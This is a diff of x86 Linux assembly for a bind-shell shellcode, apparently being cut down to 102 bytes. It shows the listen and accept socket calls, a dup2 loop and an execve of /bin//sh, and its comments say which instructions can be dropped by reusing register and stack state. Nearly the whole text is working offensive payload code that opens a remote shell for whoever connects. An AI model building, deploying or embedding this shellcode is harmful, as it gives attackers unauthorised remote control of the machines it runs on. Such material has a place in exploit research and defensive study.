@@ -10,7 +10,8 @@
 ; restriction, though attribution would be the right thing to do.  I hope
 ; it is of some value, but I make ABSOLUTELY NO WARRANTY OF ANY KIND.
 ;
-
+; 102 bytes
+;
 global	_start
 
 section	.text
@@ -59,11 +60,12 @@ return_to_bind:
 ; 
 ; listen(int sockfd, int backlog)
 ;
-	push 	byte 1		; backlog
-	push	edi		; sockfd
+;	push 	byte 1		; backlog - commented.  At this point, stack top = sockfd, next word is old stack ptr
+;	push	edi		; sockfd - commented.  Since we know stack ptr > 0, it can serve as backlog
+;	mov	[esp+4],edi	; small number for backlog
 	mov	al, 102		; sys_socketcall
 	mov	bl, 4		; sys_listen, ebx was only 2 so no need to zero out
-	mov	ecx, esp	; pointer to args
+;	mov	ecx, esp	; pointer to args - commented.  ecx was already = esp, didn't modify esp so not needed
 	int	0x80 
 ; returns 0 on success in eax, -1 on fail
 
@@ -72,6 +74,7 @@ return_to_bind:
 ;
 ;
 ; first create space for struct sockaddr
+; removed 4 instructions here because ecx already points to sockfd, don't mind overwriting the next two words
 	push	edx		; *addrlen
 	push	edx		; *addr
 	push	edi		; sockfd	
@@ -102,15 +105,18 @@ duploop:
 ;
 ; need little endian representation of /bin//sh =  0x6e69622f 0x68732f2f
 ;
-	xor	eax,eax
+; removed next two instructions because top of stack is sockfd, we know the first bytes will be zeroes so
+; we don't need to zero terminate the string
+;	xor	eax,eax
 	push	eax		; still 0, envp[] and terminate filename
-	mov	ecx, esp	; pointer to envp[]
+;	mov	ecx, esp	; pointer to envp[]
 	push 	0x68732f2f	; /bin//sh
 	push	0x6e69622f
 	mov	ebx, esp	; *filename
-	push	edx		; terminate argv
+	push	eax		; terminate argv
+	mov	edx, esp	; *envp
 	push	ebx		; *argv[0]
-	xchg	edx, ecx	; envp
+;	xchg	edx, ecx	; envp
 	mov	ecx, esp	; *list of pointers to argv values
 	mov	al, 11	
 	int	0x80
